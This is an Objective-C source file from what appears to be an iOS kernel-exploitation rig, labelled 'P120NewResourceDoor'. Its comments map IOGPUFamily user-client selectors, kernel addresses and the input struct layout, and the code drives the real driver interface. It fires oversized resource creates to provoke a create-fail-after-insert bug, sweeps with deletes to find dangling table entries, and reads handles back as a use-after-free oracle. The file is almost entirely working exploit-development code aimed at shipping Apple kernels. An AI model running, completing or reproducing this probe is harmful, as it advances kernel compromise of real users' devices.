//
//  P120NewResourceDoor.m — the 64788 NEW-RESOURCE DOOR. p120. P007 rig.
//
//  Map (byte-verified 2026-10-28 on the ON-DISK 23F77 cache, flat-delta
//  law, BEFORE this code was written — the no-guess law):
//    IOGPUFamily device-conn UC table @ VA 0xfffffff007eb9318, 55 rows
//    stride 0x18 {handler u64 chained-fixup, 4×u32 counts}. Selector map
//    decoded = the 23G71 map carried EXACTLY:
//      sel 8  stIn=-1 stOut=-1  s_new_resource   (VARIABLE struct)
//      sel 9  sIn=1             s_delete_resource(id)
//      sel 10 sIn=2             delete variant (id, flags)
//      sel 36 sIn=3 sOut=1      fn4 — the ANE-buffer registry gate (out = handle)
//      sel 37 sIn=1             resource_detach_backing(id)
//      sel 38 stIn=0x18         resource_replace_backing_bytes {id,pad,addr,len}
//      sel 40 sIn=1 stOut=2     s_create_resource_iosurface
//    NAKED GETTER byte-verified: 0x95e1bdc = pacibsp; ldr x0,[x0,#0x90]; ret
//    = the RAW SysMemory MD getter, NO retain (23G82 fix 0x95ed278 is the
//    retained twin; 23F77 keeps the naked one = LANE LIVE per note 277).
//
//  The DOOR (note 277 #2): 64788's only door =
//  IOGPUDevice::new_resource (0x95c8810 on 23F77, prologue byte-verified
//  in the same pass) OVERSIZED-IOSURFACE-CLASS create-fail-after-insert —
//  a resource whose initialize fails AFTER namespace insert leaves a
//  dangling table entry; a SUCCESSFUL sel9 delete of an id the create
//  never returned = the leftover-entry RECEIPT. The naked getter makes
//  the surviving table entry dereferencable raw (+0x90) on every fn4 walk.
//
//  s_new_resource input struct (23G71 Ghidra decompile, the same kext
//  family): +0x00 u32 resType, +0x04 u32 cache_mode (bswap32≤9), +0x14
//  u32 flags, +0x18 u64 addr, +0x48 u64 size; length 0x400 (0x58 fails).
//  Output: +0x00 gpuVA|flags<<32, +0x24 u32 registered id, +0x48 size,
//  +0x50 offset.
//
//  BOUNDS: ≤12 creates, ≤40 delete probes, bounded sweep; panic-possible
//  banner; IN-FLIGHT stamps per stage; one tap per force-quit.
//

#import "P120NewResourceDoor.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <stdarg.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P120_BUILD   @"p120-newresourcedoor-v1"
#define P120_IN_SZ   0x400
#define P120_OUT_SZ  0x80

typedef mach_port_t p_ioobject_t;
typedef p_ioobject_t p_ioservice_t;
typedef mach_port_t p_ioconnect_t;
typedef CFMutableDictionaryRef (*IOServiceMatching_t)(const char *);
typedef p_ioservice_t (*IOServiceGetMatchingService_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*IOObjectRelease_t)(p_ioobject_t);
typedef kern_return_t (*IOServiceOpen_t)(p_ioservice_t, task_port_t, uint32_t, p_ioconnect_t *);
typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t, uint32_t,
    const uint64_t *, uint32_t,
    const void *, size_t,
    uint64_t *, uint32_t *,
    void *, size_t *);
typedef void *(*DevCreate_t)(p_ioservice_t);
typedef kern_return_t (*DevRelease_t)(void *);
typedef uint32_t (*GetConn_t)(void *);
typedef void (*IOServiceClose_t)(p_ioconnect_t);

static NSMutableString *g_buf;
static int g_fd = -1;

static void L(NSString *s) {
    if (!g_buf) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { (void)write(g_fd, p, strlen(p)); (void)fcntl(g_fd, F_FULLFSYNC); }
    }
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

static kern_return_t p120_newRes(IOConnectCallMethod_t call, p_ioconnect_t conn,
                                 uint32_t resType, uint32_t cacheMode,
                                 uint32_t flags, uint64_t size,
                                 void *inBuf, void *outBuf) {
    memset(inBuf, 0, P120_IN_SZ);
    *(uint32_t *)((uint8_t *)inBuf + 0x00) = resType;
    *(uint32_t *)((uint8_t *)inBuf + 0x04) = cacheMode;
    *(uint32_t *)((uint8_t *)inBuf + 0x14) = flags;
    *(uint64_t *)((uint8_t *)inBuf + 0x18) = 0;   /* addr — kernel ORs 0x10063 */
    *(uint64_t *)((uint8_t *)inBuf + 0x48) = size;
    memset(outBuf, 0, P120_OUT_SZ);
    size_t osz = P120_OUT_SZ;
    uint32_t sc = 0;
    return call(conn, 8, NULL, 0, inBuf, P120_IN_SZ, NULL, &sc, outBuf, &osz);
}

static kern_return_t p120_del(IOConnectCallMethod_t call, p_ioconnect_t conn,
                              uint32_t id) {
    uint64_t in = id;
    return call(conn, 9, &in, 1, NULL, 0, NULL, NULL, NULL, NULL);
}

static kern_return_t p120_fn4(IOConnectCallMethod_t call, p_ioconnect_t conn,
                              uint32_t id, uint64_t *out) {
    uint64_t in[3] = { id, 0, 1 };   /* (id, 0, 1) = the 23G71-passing shape */
    uint64_t o = 0; uint32_t ocnt = 1; size_t osz = 8;
    kern_return_t kr = call(conn, 36, in, 3, NULL, 0, &o, &ocnt, NULL, &osz);
    if (out) *out = o;
    return kr;
}

@implementation P120NewResourceDoor

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p120_newresource_log.txt"] UTF8String],
                O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p120 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P120_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] 64788 device-conn map BYTE-VERIFIED on the on-disk 23F77 cache:");
    L(@"  sel8=newRes(var 0x400) sel9=delete(id) sel10=delete(id,flags)");
    L(@"  sel36=fn4(id,0,1)->handle sel37=detach sel38=replace_bytes(0x18)");
    L(@"  naked +0x90 MD getter 0x95e1bdc = ldr x0,[x0,#0x90];ret NO retain.");
    L(@"[warn] PANIC-POSSIBLE (oversized create / dangling table walk class)");
    L(@"  one tap per force-quit. IN-FLIGHT stamps per stage.");

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    IOServiceMatching_t pMatching = NULL;
    IOServiceGetMatchingService_t pGet = NULL;
    IOObjectRelease_t pRelease = NULL;
    IOServiceOpen_t pOpen = NULL;
    IOServiceClose_t pClose = NULL;
    IOConnectCallMethod_t pCall = NULL;
    DevCreate_t pDevCreate = NULL;
    GetConn_t pGetConn = NULL;
    DevRelease_t pDevRelease = NULL;
    mach_port_t *pMainPort = NULL;
    p_ioservice_t svc = 0;
    p_ioconnect_t conn = MACH_PORT_NULL;
    void *dev = NULL;
    if (!iokit || !iogpu) { L(@"[-] STOP dlopen"); goto done; }
    pMatching = dlsym(iokit, "IOServiceMatching");
    pGet = dlsym(iokit, "IOServiceGetMatchingService");
    pRelease = dlsym(iokit, "IOObjectRelease");
    pOpen = dlsym(iokit, "IOServiceOpen");
    pClose = dlsym(iokit, "IOServiceClose");
    pCall = dlsym(iokit, "IOConnectCallMethod");
    pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    pGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    if (!pMatching || !pGet || !pRelease || !pCall || !pMainPort) {
        L(@"[-] STOP dlsym"); goto done;
    }

    svc = pGet(*pMainPort, pMatching("IOGPU"));
    if (!svc) { L(@"[-] STOP no IOGPU service"); goto done; }

    dev = NULL;
    if (pDevCreate) dev = pDevCreate(svc);
    if (dev && pGetConn) conn = pGetConn(dev);
    if ((!conn || conn == MACH_PORT_NULL) && pOpen) {
        kern_return_t okr = pOpen(svc, mach_task_self(), 1, &conn);
        Lf(@"[*] IOServiceOpen type=1 kr=0x%08x", okr);
        if (okr != 0) conn = MACH_PORT_NULL;
    }
    if (!conn || conn == MACH_PORT_NULL) {
        L(@"[-] STOP no device connection"); pRelease(svc); goto done;
    }

    /* ---------- Stage A: resType-0 calibrate (the 23G71-passing shape) --- */
    L(@"");
    L(@"--- Stage A: resType-0 calibrate (sel8 + sel9) ---");
    {
        void *inBuf = malloc(P120_IN_SZ), *outBuf = malloc(P120_OUT_SZ);
        kern_return_t cr = p120_newRes(pCall, conn, 0, 0, 0, 0x1000, inBuf, outBuf);
        uint32_t id = *(uint32_t *)((uint8_t *)outBuf + 0x24);
        uint64_t gpuVA = *(uint64_t *)((uint8_t *)outBuf + 0x00);
        Lf(@"[A] sel8 resType=0 size=0x1000 kr=0x%08x id=%u gpuVA=0x%llx", cr, id, gpuVA);
        if (cr == 0 && id) {
            kern_return_t dr = p120_del(pCall, conn, id);
            Lf(@"[A] sel9 delete id=%u kr=0x%08x (expect 0 — the calibrate pair)", id, dr);
        } else {
            L(@"[A] resType-0 create rejected on THIS build — the door's");
            L(@"  calibration is not carried; everything below inherits it.");
        }
        free(inBuf); free(outBuf);
    }

    /* ---------- Stage B: the oversized CREATE-FAIL-AFTER-INSERT ladder --- */
    L(@"");
    L(@"--- Stage B: oversized IOSurface-class ladder (resType 0x82 family) ---");
    L(@"[IN FLIGHT] stage-B ladder begins");
    {
        void *inBuf = malloc(P120_IN_SZ), *outBuf = malloc(P120_OUT_SZ);
        uint64_t sizes[] = { 0x1000, 0x40000, 0x1000000, 0x8000000, 0x20000000 };
        uint32_t types[] = { 0x82, 0x80 };
        uint32_t idsIssued[64]; int nIssued = 0;
        uint32_t maxId = 0;
        memset(idsIssued, 0, sizeof idsIssued);

        for (int t = 0; t < 2; t++) {
            for (int s = 0; s < (int)(sizeof sizes / sizeof sizes[0]); s++) {
                kern_return_t cr = p120_newRes(pCall, conn, types[t], 0, 0,
                                               sizes[s], inBuf, outBuf);
                uint32_t id = *(uint32_t *)((uint8_t *)outBuf + 0x24);
                uint64_t gpuVA = *(uint64_t *)((uint8_t *)outBuf + 0x00);
                uint64_t gotSz = *(uint64_t *)((uint8_t *)outBuf + 0x48);
                Lf(@"[B] resType=0x%02x size=0x%llx kr=0x%08x id=%u gpuVA=0x%llx size_out=0x%llx",
                   types[t], sizes[s], cr, id, gpuVA, gotSz);
                if (cr == 0 && id) {
                    if (nIssued < 64) idsIssued[nIssued++] = id;
                    if (id > maxId) maxId = id;
                    kern_return_t cleanup = p120_del(pCall, conn, id);
                    Lf(@"[B]   delete id=%u kr=0x%08x", id, cleanup);
                }
                /* THE DOOR SHAPE: cr != 0 but the namespace may have kept the
                 * entry. Do NOT send more than one failure per rung. */
            }
        }

        /* ---------- Stage C: the post-fail LEFTOVER-ID sweep ---------- */
        L(@"");
        L(@"--- Stage C: post-fail leftover-id sweep + fn4 oracle ---");
        L(@"[IN FLIGHT] stage-C sweep begins");
        int leftover = 0;
        uint32_t cand = maxId > 0 ? maxId : 0;
        for (int i = 1; i <= 8 && cand > 0; i++) {
            uint32_t id = cand + (uint32_t)i;
            kern_return_t dr = p120_del(pCall, conn, id);
            Lf(@"[C] delete id=%u (never returned) kr=0x%08x%s", id, dr,
               dr == 0 ? "  <<<< LEFTOVER-ENTRY RECEIPT" : "");
            if (dr == 0) leftover++;
        }
        /* fn4 presence oracle on the last issued id (the gate readback) */
        for (int i = 0; i < nIssued && i < 4; i++) {
            uint64_t h = 0;
            kern_return_t kr = p120_fn4(pCall, conn, idsIssued[i], &h);
            Lf(@"[C] fn4 id=%u kr=0x%08x handle=0x%llx", idsIssued[i], kr, h);
        }
        Lf(@"[*] stage-C: leftover deletions=%d (0 = no dangling insert this ladder)",
           leftover);
        free(inBuf); free(outBuf);

        L(@"");
        L(@"=== VERDICT (honest) ===");
        L(@"- A SUCCESSFUL delete on an id the create never returned = the");
        L(@"  create-fail-after-INSERT receipt — the naked +0x90 getter makes");
        L(@"  that dangling entry raw-dereferencable on every fn4 walk. That");
        L(@"  pairing = the 64788 door on 23F77-class builds.");
        L(@"- fn4 handle reads on DELETED ids surviving = the registry keeps");
        L(@"  the UNRETAINED MD (note-277's leak law) — also a receipt class.");
        L(@"- Nothing above = HOLD; the door stays a map, not a receipt.");
        L(@"hasKread=NO. No claims beyond the receipts above.");
    }

    if (pClose && conn) pClose(conn);
    if (dev && pDevRelease) pDevRelease(dev);
    pRelease(svc);

done:
    if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
    NSString *ret = g_buf ?: @"(no p120 log)";
    g_buf = nil;
    return ret;
}

@end